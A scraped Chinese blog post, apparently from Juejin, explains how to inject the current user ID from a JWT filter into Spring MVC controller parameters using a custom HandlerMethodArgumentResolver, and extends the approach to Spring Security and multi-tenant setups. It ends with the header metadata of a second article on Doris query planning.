#cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">前言：一个痛点</h2>
<p>想象一下这样的场景：用户请求带着 JWT Token 进入你的系统，Filter 层面解析 Token 得到用户 ID，接下来需要：</p>
<ul>
<li>在 Controller 层获取用户信息</li>
<li>在 Service 层进行权限验证</li>
<li>在某些业务逻辑中记录操作日志</li>
</ul>
<p>每一个环节都需要知道"当前用户是谁"，看看目前常用的解决方案。</p>
<h2 data-id="heading-1">传统方案的"缺陷"</h2>
<p><strong>方案一：<a href="https://link.juejin.cn?target=https%3A%2F%2Fzhida.zhihu.com%2Fsearch%3Fcontent_id%3D266261738%26content_type%3DArticle%26match_order%3D1%26q%3DThreadLocal%26zhida_source%3Dentity" target="_blank" title="https://zhida.zhihu.com/search?content_id=266261738&amp;content_type=Article&amp;match_order=1&amp;q=ThreadLocal&amp;zhida_source=entity" ref="nofollow noopener noreferrer">ThreadLocal</a></strong></p>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-comment">// 看起来很"Hack"</span>
<span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">ThreadLocal</span>&lt;<span class="hljs-type">Long</span>&gt; currentUser <span class="hljs-operator">=</span> new <span class="hljs-type">ThreadLocal</span>&lt;&gt;();
</code></pre>
<ul>
<li><strong>线程安全问题</strong>：在异步环境下可能出现数据错乱</li>
<li><strong>内存泄漏风险</strong>：ThreadLocal 使用不当可能导致内存泄漏</li>
<li><strong>代码可读性差</strong>：隐式的数据传递方式让代码逻辑变得难以追踪</li>
</ul>
<p><strong>方案二：<a href="https://link.juejin.cn?target=https%3A%2F%2Fzhida.zhihu.com%2Fsearch%3Fcontent_id%3D266261738%26content_type%3DArticle%26match_order%3D1%26q%3DHttpServletRequest%26zhida_source%3Dentity" target="_blank" title="https://zhida.zhihu.com/search?content_id=266261738&amp;content_type=Article&amp;match_order=1&amp;q=HttpServletRequest&amp;zhida_source=entity" ref="nofollow noopener noreferrer">HttpServletRequest</a>.setAttribute()</strong></p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// 看起来很"丑"</span>
<span class="hljs-meta">@GetMapping(<span class="hljs-string">"/me"</span>)</span>
<span class="hljs-keyword">public</span> User getMyProfile(HttpServletRequest request) {
    <span class="hljs-built_in">Long</span> userId = (<span class="hljs-built_in">Long</span>) request.getAttribute(<span class="hljs-string">"currentUserId"</span>);
    <span class="hljs-keyword">return</span> userService.getById(userId);
}
</code></pre>
<ul>
<li><strong>类型不安全</strong>：需要手动进行类型转换，容易出现 ClassCastException</li>
<li><strong>代码冗余</strong>：每个需要用户信息的 Controller 都要重复相同的逻辑</li>
<li><strong>违反了 Controller 的"纯净性"</strong> ：引入了 Servlet API 依赖</li>
<li><strong>字符串魔法值</strong>：属性名称容易写错，编译时无法检查</li>
</ul>
<h2 data-id="heading-2"><a href="https://link.juejin.cn?target=https%3A%2F%2Fzhida.zhihu.com%2Fsearch%3Fcontent_id%3D266261738%26content_type%3DArticle%26match_order%3D1%26q%3DSpring%2BMVC%26zhida_source%3Dentity" target="_blank" title="https://zhida.zhihu.com/search?content_id=266261738&amp;content_type=Article&amp;match_order=1&amp;q=Spring+MVC&amp;zhida_source=entity" ref="nofollow noopener noreferrer">Spring MVC</a>：HandlerMethodArgumentResolver</h2>
<p>Spring MVC 提供了一个解决方案：<strong>自定义参数解析器（HandlerMethodArgumentResolver）</strong> 。</p>
<p>这个设计模式体现了 Spring 框架一贯的"约定优于配置"的理念。它不要求我们改变 Filter 层面的实现，而是在参数解析这个环节做文章，通过扩展框架的能力来解决问题。</p>
<h2 data-id="heading-3">设计思路</h2>
<p>Spring MVC 的 HandlerMethodArgumentResolver 机制实际上是一种"适配器模式"的应用。它将不同来源的参数（Request 参数、Path 变量、Header 信息、Session 数据等）统一适配成 Controller 方法可以直接使用的形式。</p>
<p>这种设计的巧妙之处在于：</p>
<ul>
<li><strong>职责分离</strong>：Filter 负责认证和设置状态，Resolver 负责参数转换</li>
<li><strong>可扩展性</strong>：可以轻松添加新的参数解析逻辑</li>
<li><strong>无侵入性</strong>：不影响现有的代码结构</li>
</ul>
<p>这个方案的核心思想是：<strong>将 request.getAttribute() 操作，封装成类型安全的方法参数</strong>。</p>
<h2 data-id="heading-4">核心实现</h2>
<h2 data-id="heading-5">第一步：创建自定义注解</h2>
<pre><code class="hljs language-less" lang="less"><span class="hljs-variable">@Target</span>(ElementType.PARAMETER)
<span class="hljs-variable">@Retention</span>(RetentionPolicy.RUNTIME)
public <span class="hljs-variable">@interface</span> CurrentUser {
}
</code></pre>
<h2 data-id="heading-6">第二步：实现参数解析器</h2>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Component</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CurrentUserArgumentResolver</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">HandlerMethodArgumentResolver</span> {

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">supportsParameter</span><span class="hljs-params">(MethodParameter parameter)</span> {
        <span class="hljs-comment">// 只解析被 @CurrentUser 标记的参数</span>
        <span class="hljs-keyword">return</span> parameter.hasParameterAnnotation(CurrentUser.class);
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">resolveArgument</span><span class="hljs-params">(MethodParameter parameter,
                                 ModelAndViewContainer mavContainer,
                                 NativeWebRequest webRequest,
                                 WebDataBinderFactory binderFactory)</span> <span class="hljs-keyword">throws</span> Exception {
        <span class="hljs-comment">// 从 request 中获取之前设置的用户ID</span>
        <span class="hljs-keyword">return</span> webRequest.getAttribute(<span class="hljs-string">"currentUserId"</span>, WebRequest.SCOPE_REQUEST);
    }
}
</code></pre>
<h2 data-id="heading-7">第三步：注册解析器</h2>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-meta">@Configuration</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">WebMvcConfig</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">WebMvcConfigurer</span> {

    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> <span class="hljs-title class_">CurrentUserArgumentResolver</span> currentUserArgumentResolver;

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">addArgumentResolvers</span>(<span class="hljs-params">List&lt;HandlerMethodArgumentResolver&gt; resolvers</span>) {
        resolvers.<span class="hljs-title function_">add</span>(currentUserArgumentResolver);
    }
}
</code></pre>
<h2 data-id="heading-8">方案示例</h2>
<h2 data-id="heading-9">Filter 层面</h2>
<pre><code class="hljs language-scala" lang="scala"><span class="hljs-meta">@Component</span>
public <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">JwtAuthenticationFilter</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">OncePerRequestFilter</span> </span>{

    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> <span class="hljs-type">JwtService</span> jwtService;

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">protected</span> void doFilterInternal(<span class="hljs-type">HttpServletRequest</span> request,
                                   <span class="hljs-type">HttpServletResponse</span> response,
                                   <span class="hljs-type">FilterChain</span> filterChain) <span class="hljs-keyword">throws</span> <span class="hljs-type">ServletException</span>, <span class="hljs-type">IOException</span> {

        <span class="hljs-type">String</span> authorizationHeader = request.getHeader(<span class="hljs-string">"Authorization"</span>);

        <span class="hljs-keyword">if</span> (authorizationHeader != <span class="hljs-literal">null</span> &amp;&amp; authorizationHeader.startsWith(<span class="hljs-string">"Bearer "</span>)) {
            <span class="hljs-type">String</span> token = authorizationHeader.substring(<span class="hljs-number">7</span>);
            <span class="hljs-keyword">try</span> {
                <span class="hljs-type">Long</span> userId = jwtService.extractUserId(token);
                <span class="hljs-comment">// 标准：使用 request.setAttribute 设置</span>
                request.setAttribute(<span class="hljs-string">"currentUserId"</span>, userId);
            } <span class="hljs-keyword">catch</span> (<span class="hljs-type">Exception</span> e) {
                <span class="hljs-comment">// token 无效，继续执行后续逻辑</span>
            }
        }

        filterChain.doFilter(request, response);
    }
}
</code></pre>
<h2 data-id="heading-10">Controller 层面</h2>
<pre><code class="hljs language-less" lang="less"><span class="hljs-variable">@RestController</span>
<span class="hljs-variable">@RequestMapping</span>(<span class="hljs-string">"/api/users"</span>)
public class UserController {

    <span class="hljs-variable">@Autowired</span>
    private UserService userService;

    <span class="hljs-variable">@GetMapping</span>(<span class="hljs-string">"/me"</span>)
    public ResponseEntity&lt;User&gt; <span class="hljs-built_in">getCurrentUser</span>(<span class="hljs-variable">@CurrentUser</span> Long userId) {
        <span class="hljs-comment">// userId 被"魔法般"地自动注入了！</span>
        <span class="hljs-selector-tag">User</span> <span class="hljs-selector-tag">user</span> = <span class="hljs-selector-tag">userService</span><span class="hljs-selector-class">.findById</span>(userId);
        <span class="hljs-selector-tag">return</span> <span class="hljs-selector-tag">ResponseEntity</span><span class="hljs-selector-class">.ok</span>(user);
    }

    @<span class="hljs-selector-tag">PutMapping</span>(<span class="hljs-string">"/me"</span>)
    <span class="hljs-selector-tag">public</span> <span class="hljs-selector-tag">ResponseEntity</span>&lt;<span class="hljs-selector-tag">User</span>&gt; <span class="hljs-selector-tag">updateCurrentUser</span>(<span class="hljs-variable">@CurrentUser</span> Long userId,
                                                 <span class="hljs-variable">@RequestBody</span> UserUpdateRequest request) {
        <span class="hljs-comment">// 每个 Controller 方法都可以直接使用 @CurrentUser</span>
        <span class="hljs-selector-tag">User</span> <span class="hljs-selector-tag">updatedUser</span> = <span class="hljs-selector-tag">userService</span><span class="hljs-selector-class">.updateUser</span>(userId, request);
        <span class="hljs-selector-tag">return</span> <span class="hljs-selector-tag">ResponseEntity</span><span class="hljs-selector-class">.ok</span>(updatedUser);
    }

    @<span class="hljs-selector-tag">GetMapping</span>(<span class="hljs-string">"/permissions"</span>)
    <span class="hljs-selector-tag">public</span> <span class="hljs-selector-tag">ResponseEntity</span>&lt;<span class="hljs-selector-tag">List</span>&lt;<span class="hljs-selector-tag">Permission</span>&gt;&gt; <span class="hljs-selector-tag">getUserPermissions</span>(<span class="hljs-variable">@CurrentUser</span> Long userId) {
        <span class="hljs-comment">// 完全类型安全，无需手动类型转换</span>
        <span class="hljs-selector-tag">List</span>&lt;<span class="hljs-selector-tag">Permission</span>&gt; <span class="hljs-selector-tag">permissions</span> = <span class="hljs-selector-tag">userService</span><span class="hljs-selector-class">.getUserPermissions</span>(userId);
        <span class="hljs-selector-tag">return</span> <span class="hljs-selector-tag">ResponseEntity</span><span class="hljs-selector-class">.ok</span>(permissions);
    }
}
</code></pre>
<h2 data-id="heading-11">原理解析</h2>
<h2 data-id="heading-12">HandlerMethodArgumentResolver 工作流程</h2>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/37c6855cd485461d92e95dc0454a429d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2Yee8lueoi-eIseWlveiAhQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768287797&amp;x-signature=UW8bK%2Bgz2LFY8t1C8s0yJUYhqd4%3D" alt="" loading="lazy"/></p>
<p>在这个流程中，Spring MVC 会按照注册的顺序遍历所有的 HandlerMethodArgumentResolver，对于每个需要解析的参数，都会调用 supportsParameter() 方法判断是否支持，如果支持则调用 resolveArgument() 方法进行实际的参数解析。</p>
<h2 data-id="heading-13">方案优势</h2>
<p>这个方案的优势不仅体现在代码层面，更重要的是它符合软件工程的多个重要原则：</p>
<p><strong>1. 类型安全</strong>：编译时检查，避免运行时类型转换错误。当你错误地将 @CurrentUser Long 写成 @CurrentUser String 时，编译器会立刻提醒你。</p>
<p><strong>2. 代码简洁</strong>：Controller 方法专注于业务逻辑。不再需要每次都写 request.getAttribute() 的样板代码，让业务逻辑更加清晰。</p>
<p><strong>3. 可测试性</strong>：Mock 变得简单直接。在单元测试中，你只需要模拟参数值，而不需要构建整个 HttpServletRequest 对象。</p>
<p><strong>4. 可维护性</strong>：统一的用户信息获取方式。当需要修改用户信息的获取逻辑时，只需要修改 Resolver，而不需要修改每个 Controller 方法。</p>
<p><strong>5. 扩展性</strong>：轻松支持更多用户相关属性。通过修改 Resolver 的逻辑，可以支持返回 User 对象、用户权限、用户偏好设置等复杂信息。</p>
<p><strong>6. 关注点分离</strong>：Filter 专注于认证逻辑，Resolver 专注于参数解析，Controller 专注于业务逻辑，各司其职，代码结构更加清晰。</p>
<h2 data-id="heading-14">进阶用法：传递完整用户对象</h2>
<p>在真实的项目中，我们往往需要的不仅仅是用户 ID，而是完整的用户信息、权限数据、或者用户偏好设置。HandlerMethodArgumentResolver 的强大之处就在于它可以智能地根据参数类型返回不同的对象。</p>
<h2 data-id="heading-15">扩展解析器支持复杂对象</h2>
<p>这里的核心思想是<strong>根据 Controller 方法的参数类型动态决定返回什么对象</strong>，这样可以最大程度地提高代码的灵活性和复用性。</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-meta">@Component</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CurrentUserArgumentResolver</span> <span class="hljs-title">implements</span> <span class="hljs-title">HandlerMethodArgumentResolver</span> {

    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> UserService userService;

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> boolean supportsParameter(MethodParameter parameter) {
        <span class="hljs-keyword">return</span> parameter.hasParameterAnnotation(CurrentUser.<span class="hljs-keyword">class</span>);
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> Object resolveArgument(MethodParameter parameter,
                                 ModelAndViewContainer mavContainer,
                                 NativeWebRequest webRequest,
                                 WebDataBinderFactory binderFactory) throws Exception {

        <span class="hljs-built_in">Long</span> userId = (<span class="hljs-built_in">Long</span>) webRequest.getAttribute(<span class="hljs-string">"currentUserId"</span>, WebRequest.SCOPE_REQUEST);

        <span class="hljs-keyword">if</span> (userId == <span class="hljs-literal">null</span>) {
            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>; <span class="hljs-comment">// 或者抛出异常</span>
        }

        <span class="hljs-comment">// 根据参数类型决定返回什么</span>
        Class&lt;?&gt; parameterType = parameter.getParameterType();

        <span class="hljs-keyword">if</span> (parameterType == <span class="hljs-built_in">Long</span>.<span class="hljs-keyword">class</span> || parameterType == long.<span class="hljs-keyword">class</span>) {
            <span class="hljs-keyword">return</span> userId;
        } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (parameterType == User.<span class="hljs-keyword">class</span>) {
            <span class="hljs-keyword">return</span> userService.findById(userId);
        } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (parameterType == UserProfile.<span class="hljs-keyword">class</span>) {
            <span class="hljs-keyword">return</span> userService.getUserProfile(userId);
        }

        <span class="hljs-keyword">throw</span> new IllegalArgumentException(<span class="hljs-string">"Unsupported parameter type: "</span> + parameterType);
    }
}
</code></pre>
<h2 data-id="heading-16">Controller 中的多种用法</h2>
<pre><code class="hljs language-less" lang="less"><span class="hljs-variable">@RestController</span>
<span class="hljs-variable">@RequestMapping</span>(<span class="hljs-string">"/api"</span>)
public class AdvancedUserController {

    <span class="hljs-variable">@GetMapping</span>(<span class="hljs-string">"/user/id"</span>)
    public ResponseEntity&lt;String&gt; <span class="hljs-built_in">getUserId</span>(<span class="hljs-variable">@CurrentUser</span> Long userId) {
        <span class="hljs-selector-tag">return</span> <span class="hljs-selector-tag">ResponseEntity</span><span class="hljs-selector-class">.ok</span>(<span class="hljs-string">"User ID: "</span> + userId);
    }

    @<span class="hljs-selector-tag">GetMapping</span>(<span class="hljs-string">"/user/info"</span>)
    <span class="hljs-selector-tag">public</span> <span class="hljs-selector-tag">ResponseEntity</span>&lt;<span class="hljs-selector-tag">User</span>&gt; <span class="hljs-selector-tag">getUserInfo</span>(<span class="hljs-variable">@CurrentUser</span> User user) {
        <span class="hljs-selector-tag">return</span> <span class="hljs-selector-tag">ResponseEntity</span><span class="hljs-selector-class">.ok</span>(user);
    }

    @<span class="hljs-selector-tag">GetMapping</span>(<span class="hljs-string">"/user/profile"</span>)
    <span class="hljs-selector-tag">public</span> <span class="hljs-selector-tag">ResponseEntity</span>&lt;<span class="hljs-selector-tag">UserProfile</span>&gt; <span class="hljs-selector-tag">getUserProfile</span>(<span class="hljs-variable">@CurrentUser</span> UserProfile profile) {
        <span class="hljs-selector-tag">return</span> <span class="hljs-selector-tag">ResponseEntity</span><span class="hljs-selector-class">.ok</span>(profile);
    }
}
</code></pre>
<h2 data-id="heading-17">实战技巧与注意事项</h2>
<p>在实际项目中使用 HandlerMethodArgumentResolver 时，还需要考虑一些实际的工程问题。下面是一些常见的场景和解决方案。</p>
<h2 data-id="heading-18">1. 异常处理</h2>
<p>在用户未登录或者 Token 无效的情况下，我们需要优雅地处理异常情况，而不是让系统抛出难以理解的错误信息。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Component</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CurrentUserArgumentResolver</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">HandlerMethodArgumentResolver</span> {

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">resolveArgument</span><span class="hljs-params">(...)</span> <span class="hljs-keyword">throws</span> Exception {
        <span class="hljs-type">Long</span> <span class="hljs-variable">userId</span> <span class="hljs-operator">=</span> (Long) webRequest.getAttribute(<span class="hljs-string">"currentUserId"</span>, WebRequest.SCOPE_REQUEST);

        <span class="hljs-keyword">if</span> (userId == <span class="hljs-literal">null</span>) {
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnauthorizedException</span>(<span class="hljs-string">"用户未登录"</span>);
        }

        <span class="hljs-keyword">return</span> userId;
    }
}

<span class="hljs-meta">@ControllerAdvice</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">GlobalExceptionHandler</span> {

    <span class="hljs-meta">@ExceptionHandler(UnauthorizedException.class)</span>
    <span class="hljs-keyword">public</span> ResponseEntity&lt;String&gt; <span class="hljs-title function_">handleUnauthorized</span><span class="hljs-params">(UnauthorizedException e)</span> {
        <span class="hljs-keyword">return</span> ResponseEntity.status(<span class="hljs-number">401</span>).body(e.getMessage());
    }
}
</code></pre>
<h2 data-id="heading-19">2. 与 <a href="https://link.juejin.cn?target=https%3A%2F%2Fzhida.zhihu.com%2Fsearch%3Fcontent_id%3D266261738%26content_type%3DArticle%26match_order%3D1%26q%3DSpring%2BSecurity%26zhida_source%3Dentity" target="_blank" title="https://zhida.zhihu.com/search?content_id=266261738&amp;content_type=Article&amp;match_order=1&amp;q=Spring+Security&amp;zhida_source=entity" ref="nofollow noopener noreferrer">Spring Security</a> 集成</h2>
<p>在许多企业级应用中，我们使用 Spring Security 进行认证和授权。如何将 Spring Security 的用户信息与我们的自定义 Resolver 结合使用是一个常见问题。</p>
<p>Spring Security 提供了 SecurityContextHolder 来存储当前用户的认证信息，我们可以直接从中获取用户详情，然后转换成我们需要的格式。这种集成方式的优势是可以复用 Spring Security 的完整认证体系，包括各种认证方式（JWT、OAuth2、Session 等）。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Component</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CurrentUserArgumentResolver</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">HandlerMethodArgumentResolver</span> {

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">resolveArgument</span><span class="hljs-params">(...)</span> <span class="hljs-keyword">throws</span> Exception {
        <span class="hljs-type">Authentication</span> <span class="hljs-variable">authentication</span> <span class="hljs-operator">=</span> SecurityContextHolder.getContext().getAuthentication();

        <span class="hljs-keyword">if</span> (authentication != <span class="hljs-literal">null</span> &amp;&amp; authentication.isAuthenticated()) {
            <span class="hljs-type">UserDetails</span> <span class="hljs-variable">userDetails</span> <span class="hljs-operator">=</span> (UserDetails) authentication.getPrincipal();
            <span class="hljs-keyword">return</span> Long.parseLong(userDetails.getUsername()); <span class="hljs-comment">// 假设username存储的是userId</span>
        }

        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;
    }
}
</code></pre>
<h2 data-id="heading-20">3. <a href="https://link.juejin.cn?target=https%3A%2F%2Fzhida.zhihu.com%2Fsearch%3Fcontent_id%3D266261738%26content_type%3DArticle%26match_order%3D1%26q%3D%25E5%25A4%259A%25E7%25A7%259F%25E6%2588%25B7%26zhida_source%3Dentity" target="_blank" title="https://zhida.zhihu.com/search?content_id=266261738&amp;content_type=Article&amp;match_order=1&amp;q=%E5%A4%9A%E7%A7%9F%E6%88%B7&amp;zhida_source=entity" ref="nofollow noopener noreferrer">多租户</a>场景</h2>
<p>在 SaaS 应用中，多租户是一个常见的需求。除了当前用户信息，我们还需要知道当前租户的信息。通过创建多个自定义注解和对应的 Resolver，我们可以轻松实现这种需求。</p>
<pre><code class="hljs language-less" lang="less"><span class="hljs-variable">@Target</span>(ElementType.PARAMETER)
<span class="hljs-variable">@Retention</span>(RetentionPolicy.RUNTIME)
public <span class="hljs-variable">@interface</span> CurrentTenant {
}

<span class="hljs-variable">@Component</span>
public class CurrentTenantArgumentResolver implements HandlerMethodArgumentResolver {

    <span class="hljs-variable">@Override</span>
    public boolean <span class="hljs-built_in">supportsParameter</span>(MethodParameter parameter) {
        <span class="hljs-selector-tag">return</span> <span class="hljs-selector-tag">parameter</span><span class="hljs-selector-class">.hasParameterAnnotation</span>(CurrentTenant.class);
    }

    @<span class="hljs-selector-tag">Override</span>
    <span class="hljs-selector-tag">public</span> <span class="hljs-selector-tag">Object</span> <span class="hljs-selector-tag">resolveArgument</span>(...) <span class="hljs-selector-tag">throws</span> <span class="hljs-selector-tag">Exception</span> {
        <span class="hljs-selector-tag">return</span> <span class="hljs-selector-tag">webRequest</span><span class="hljs-selector-class">.getAttribute</span>(<span class="hljs-string">"currentTenantId"</span>, WebRequest.SCOPE_REQUEST);
    }
}

@<span class="hljs-selector-tag">GetMapping</span>(<span class="hljs-string">"/tenant/data"</span>)
<span class="hljs-selector-tag">public</span> <span class="hljs-selector-tag">ResponseEntity</span>&lt;<span class="hljs-selector-tag">List</span>&lt;<span class="hljs-selector-tag">Data</span>&gt;&gt; <span class="hljs-selector-tag">getTenantData</span>(<span class="hljs-variable">@CurrentUser</span> Long userId,
                                               <span class="hljs-variable">@CurrentTenant</span> Long tenantId) {
    <span class="hljs-comment">// 同时获取当前用户和租户信息</span>
    <span class="hljs-selector-tag">List</span>&lt;<span class="hljs-selector-tag">Data</span>&gt; <span class="hljs-selector-tag">data</span> = <span class="hljs-selector-tag">dataService</span><span class="hljs-selector-class">.findByUserAndTenant</span>(userId, tenantId);
    <span class="hljs-selector-tag">return</span> <span class="hljs-selector-tag">ResponseEntity</span><span class="hljs-selector-class">.ok</span>(data);
}
</code></pre>
<h2 data-id="heading-21">总结</h2>
<p>通过 Spring MVC 的 HandlerMethodArgumentResolver我们实现了一个可以"跨 Filter 与 Controller 传参"的技术实现方案。将底层 Servlet API 的 request.getAttribute() 操作抽象为编译时类型安全的方法参数注入，实现了框架层面的参数解析适配，既保持了架构的纯净性，又提供了强大的扩展能力。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[深入doris查询计划以及io调度（一）查询规划器planner]]></title>    <link>https://juejin.cn/post/7591882877311729716</link>    <guid>https://juejin.cn/post/7591882877311729716</guid>    <pubDate>2026-01-06T07:45:35.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7591882877311729716" data-draft-id="7591882877311664180" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="深入doris查询计划以及io调度（一）查询规划器planner"/> <meta itemprop="keywords" content="数据库"/> <meta itemprop="datePublished" content="2026-01-06T07:45:35.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="语落心生"/> <meta itemprop="url" content="https://juejin.cn/user/2875978147955741"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            深入doris查询计划以及io调度（一）查询规划器planner
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2875978147955741/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    语落心生
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-06T07:45:35.000Z" title="Tue Jan 06 2026 07:45:35 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-06
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读16分钟
